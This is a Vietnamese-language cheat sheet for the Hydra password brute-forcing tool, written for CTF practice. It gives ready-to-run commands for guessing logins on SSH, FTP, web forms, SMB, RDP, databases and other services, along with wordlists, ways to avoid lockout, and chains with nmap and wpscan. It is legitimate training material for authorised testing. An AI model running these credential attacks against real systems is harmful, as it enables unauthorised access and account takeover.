## 📦 Cài đặt

```bash
# Ubuntu / Debian
sudo apt install hydra hydra-gtk

# Build from source
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra && ./configure && make && sudo make install

# Kiểm tra version & supported protocols
hydra -h
hydra --list-tasks
```

---

## 🚀 Cú pháp cơ bản

```
hydra [options] target protocol
hydra [options] -L users.txt -P pass.txt target protocol
hydra [options] -l user -P pass.txt target protocol
```

---

## 🔧 Options quan trọng

|Option|Mô tả|
|---|---|
|`-l <user>`|Single username|
|`-L <file>`|Danh sách usernames|
|`-p <pass>`|Single password|
|`-P <file>`|Danh sách passwords|
|`-u`|Loop users trước (default loop passwords trước)|
|`-C <file>`|Combo file `user:pass` mỗi dòng|
|`-e nsr`|`n`=null pass, `s`=same as login, `r`=reverse login|
|`-t <n>`|Số threads (default: 16)|
|`-T <n>`|Số tasks song song (default: 64)|
|`-w <n>`|Timeout giây (default: 32)|
|`-W <n>`|Wait giữa các attempt (giây)|
|`-f`|Dừng khi tìm được 1 valid credential|
|`-F`|Dừng khi tìm được credential ở bất kỳ host nào|
|`-v`|Verbose|
|`-V`|Rất verbose (in từng attempt)|
|`-d`|Debug mode|
|`-q`|Quiet — không in errors|
|`-o <file>`|Ghi kết quả ra file|
|`-b <format>`|Output format: text, jsonv1|
|`-R`|Restore session bị interrupt|
|`-I`|Ignore restore file (bắt đầu lại)|
|`-S`|Dùng SSL|
|`-s <port>`|Custom port|
|`-x min:max:charset`|Password generation|
|`-m <module_opts>`|Module-specific options|
|`//`|Separator cho module options|

---

## 🌐 Các Protocol phổ biến trong CTF

### SSH

```bash
# Cơ bản
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1

# Custom port
hydra -l admin -P passwords.txt -s 2222 ssh://10.10.10.1

# Nhiều users
hydra -L users.txt -P passwords.txt ssh://10.10.10.1 -t 4

# Verbose để xem tiến độ
hydra -l admin -P rockyou.txt ssh://10.10.10.1 -v -f

# SSH với null/same/reverse password
hydra -L users.txt -e nsr ssh://10.10.10.1
```

### FTP

```bash
hydra -l admin -P rockyou.txt ftp://10.10.10.1
hydra -L users.txt -P passwords.txt ftp://10.10.10.1
hydra -l anonymous -p anonymous ftp://10.10.10.1
```

### HTTP Basic Auth

```bash
hydra -l admin -P rockyou.txt http-get://10.10.10.1/admin/

# HTTPS
hydra -l admin -P rockyou.txt https-get://10.10.10.1/admin/
```

### HTTP POST Form (Login page — rất hay dùng CTF)

```bash
# Syntax: http-post-form "path:POST_body:F=fail_string"
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# Với HTTPS
hydra -l admin -P rockyou.txt 10.10.10.1 https-post-form \
  "/login:username=^USER^&password=^PASS^:F=Login failed"

# Khi success string dễ nhận ra hơn failure
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=Dashboard"

# Với cookie session (cần thiết khi có CSRF token tĩnh)
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=error:H=Cookie: session=abc123"
```

### HTTP GET Form

```bash
hydra -l admin -P rockyou.txt 10.10.10.1 http-get-form \
  "/login?user=^USER^&pass=^PASS^:F=incorrect"
```

### SMB / Samba (Windows CTF boxes)

```bash
hydra -l administrator -P rockyou.txt smb://10.10.10.1
hydra -L users.txt -P passwords.txt smb://10.10.10.1
hydra -l admin -P rockyou.txt -t 1 smb://10.10.10.1   # t=1 vì SMB giới hạn
```

### RDP (Windows)

```bash
hydra -l administrator -P rockyou.txt rdp://10.10.10.1
hydra -L users.txt -P rockyou.txt rdp://10.10.10.1 -t 4
```

### Telnet

```bash
hydra -l admin -P rockyou.txt telnet://10.10.10.1
hydra -l root -P rockyou.txt telnet://10.10.10.1 -t 32
```

### MySQL

```bash
hydra -l root -P rockyou.txt mysql://10.10.10.1
hydra -l root -p "" mysql://10.10.10.1           # empty password
hydra -L users.txt -P passwords.txt mysql://10.10.10.1
```

### PostgreSQL

```bash
hydra -l postgres -P rockyou.txt postgres://10.10.10.1
```

### MSSQL

```bash
hydra -l sa -P rockyou.txt mssql://10.10.10.1
```

### SMTP

```bash
hydra -l user@domain.com -P rockyou.txt smtp://10.10.10.1
hydra -l admin -P rockyou.txt smtp://10.10.10.1 -s 587
hydra -l admin -P rockyou.txt smtps://10.10.10.1          # SMTPS
```

### IMAP / POP3

```bash
hydra -l user@domain.com -P rockyou.txt imap://10.10.10.1
hydra -l user -P rockyou.txt pop3://10.10.10.1
```

### VNC

```bash
hydra -P rockyou.txt vnc://10.10.10.1             # VNC không cần username
hydra -s 5901 -P rockyou.txt vnc://10.10.10.1
```

### SNMP

```bash
hydra -P community_strings.txt snmp://10.10.10.1
```

### LDAP

```bash
hydra -l "cn=admin,dc=example,dc=com" -P rockyou.txt ldap3://10.10.10.1
```

### Redis

```bash
hydra -P rockyou.txt redis://10.10.10.1
```

### MongoDB

```bash
hydra -l admin -P rockyou.txt mongodb://10.10.10.1
```

### Cisco / Router

```bash
hydra -P rockyou.txt cisco://10.10.10.1
hydra -P rockyou.txt cisco-enable://10.10.10.1
```

---

## 📂 Wordlists phổ biến trong CTF

```bash
# Rockyou — king of CTF wordlists
/usr/share/wordlists/rockyou.txt

# SecLists (cài thêm)
sudo apt install seclists
/usr/share/seclists/Passwords/
/usr/share/seclists/Usernames/
/usr/share/seclists/Discovery/

# Các file hay dùng
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/Names/names.txt

# Default credentials
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv

# Web default creds
/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```

---

## ⚡ Password Generation (`-x`)

```bash
# Format: -x min_len:max_len:charset
# Charset: a=lowercase, A=uppercase, 1=digits, custom chars

# 4-6 ký tự chỉ số
hydra -l admin -x 4:6:1 ssh://10.10.10.1

# 4-8 ký tự lowercase
hydra -l admin -x 4:8:a ssh://10.10.10.1

# Mixed alphanumeric
hydra -l admin -x 6:8:aA1 ssh://10.10.10.1

# Thêm special chars
hydra -l admin -x 6:8:aA1!@# ssh://10.10.10.1

# Chỉ 4 chữ số (PIN)
hydra -l admin -x 4:4:1 http-post-form \
  "/pin:pin=^PASS^:F=wrong"
```

---

## 🎯 CTF-Specific Patterns

### Pattern 1: Quick wins — thử default creds trước

```bash
# null / same / reverse password
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -e nsr ssh://10.10.10.1 -t 4 -f

# Top 10 most common passwords
hydra -L users.txt \
  -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \
  ssh://10.10.10.1 -f
```

### Pattern 2: Web login form (CTF web challenge)

```bash
# Step 1: Intercept request bằng Burp/DevTools
# POST /login HTTP/1.1
# username=admin&password=test&_token=xxx

# Step 2: Build hydra command
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid username or password" \
  -V -f

# Step 3: Nếu có CSRF token tĩnh
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form \
  "/login:_token=STATIC_TOKEN&username=^USER^&password=^PASS^:F=failed" \
  -V -f
```

### Pattern 3: Username enumeration → focused brute force

```bash
# Tìm valid usernames trước (khác error message)
# Sau đó brute force chỉ valid user

hydra -l validuser -P rockyou.txt ssh://10.10.10.1 -t 4 -f -o found.txt
```

### Pattern 4: Combo list (user:pass từ leak / OSINT)

```bash
# File format: username:password
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv \
  ftp://10.10.10.1

# Tự tạo combo từ username + variations
# user:user, user:user123, user:Password1, etc.
hydra -C custom_combos.txt ssh://10.10.10.1
```

### Pattern 5: Multiple targets

```bash
# File chứa danh sách IPs
hydra -l admin -P rockyou.txt -M targets.txt ssh

# Dùng CIDR (không native, workaround)
nmap -sn 192.168.1.0/24 -oG - | awk '/Up/{print $2}' > live_hosts.txt
hydra -l admin -P rockyou.txt -M live_hosts.txt ssh
```

### Pattern 6: Resume bị ngắt

```bash
# Hydra tự lưu hydra.restore khi bị Ctrl+C
hydra -R          # restore và tiếp tục
hydra -I ...      # ignore restore, bắt đầu lại
```

---

## 🔍 Verbose & Debug

```bash
# Xem từng attempt (CTF debugging)
hydra -l admin -P rockyou.txt ssh://10.10.10.1 -V

# Verbose nhưng không spam
hydra -l admin -P rockyou.txt ssh://10.10.10.1 -v

# Debug full
hydra -l admin -P rockyou.txt ssh://10.10.10.1 -d

# Ghi kết quả ra file
hydra -l admin -P rockyou.txt ssh://10.10.10.1 -o results.txt

# JSON output
hydra -l admin -P rockyou.txt ssh://10.10.10.1 -b jsonv1 -o results.json
```

---

## ⚙️ Tuning performance

```bash
# SSH — giảm threads để tránh lockout
hydra -l admin -P rockyou.txt ssh://10.10.10.1 -t 4

# Web form — tăng threads nếu server chịu được
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form \
  "/login:u=^USER^&p=^PASS^:F=fail" -t 64

# Thêm delay giữa attempts (tránh lockout)
hydra -l admin -P rockyou.txt ssh://10.10.10.1 -W 1

# SMB — t=1 bắt buộc
hydra -l admin -P rockyou.txt smb://10.10.10.1 -t 1

# VNC — t nhỏ
hydra -P rockyou.txt vnc://10.10.10.1 -t 4
```

---

## 🆚 Hydra vs các tool khác

|Tool|Khi nào dùng|
|---|---|
|**Hydra**|Multi-protocol, web forms, CTF all-rounder|
|**Medusa**|Alternative to Hydra, tốt cho FTP/SSH|
|**Ncrack**|Nmap project, tốt cho RDP/SSH|
|**CrackMapExec**|Windows AD / SMB focused|
|**Burp Intruder**|Web login khi cần handle CSRF động|
|**ffuf / gobuster**|Web fuzzing, directory brute|
|**Hashcat / John**|Offline hash cracking|

---

## 🧩 Kết hợp với tools khác (IppSec style)

```bash
# Nmap → tìm services → Hydra
nmap -sV 10.10.10.1 -p- --open -oG open_ports.txt
# Sau đó chạy hydra cho từng service tìm được

# Enum users trước (enum4linux, finger) → focused hydra
enum4linux -U 10.10.10.1 | grep "user:" | awk -F'[' '{print $2}' | awk -F']' '{print $1}' > users.txt
hydra -L users.txt -P rockyou.txt smb://10.10.10.1 -t 1

# WPScan → users → Hydra trên WordPress
wpscan --url http://10.10.10.1 --enumerate u
hydra -L wp_users.txt -P rockyou.txt 10.10.10.1 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=ERROR" -f

# ffuf để tìm login endpoint → Hydra
ffuf -u http://10.10.10.1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form \
  "/found_login:user=^USER^&pass=^PASS^:F=failed"
```

---

## ⚠️ Troubleshooting

```bash
# HTTP form không work — debug với -V
hydra ... http-post-form "/path:body:F=fail" -V

# Sai fail string → dùng -V để xem response
# Đảm bảo F= match chính xác text trong response

# Success string thay vì fail string
hydra ... http-post-form "/path:body:S=Welcome"

# Connection timeout — tăng -w
hydra -l admin -P rockyou.txt ssh://10.10.10.1 -w 60

# Quá nhiều lỗi — giảm threads
hydra -l admin -P rockyou.txt ssh://10.10.10.1 -t 2

# SSH "Too many authentication failures"
hydra -l admin -P rockyou.txt ssh://10.10.10.1 -t 1 -W 2

# Kiểm tra protocol được support
hydra -h | grep -i <protocol>
```

---

## 📚 Tài liệu tham khảo

- **GitHub**: [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
- **Man page**: `man hydra`
- **Help**: `hydra -h`
- **Module help**: `hydra -U http-post-form`
- **SecLists**: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

---

_Chỉ sử dụng trên hệ thống bạn được phép kiểm tra. Brute force trái phép là vi phạm pháp luật._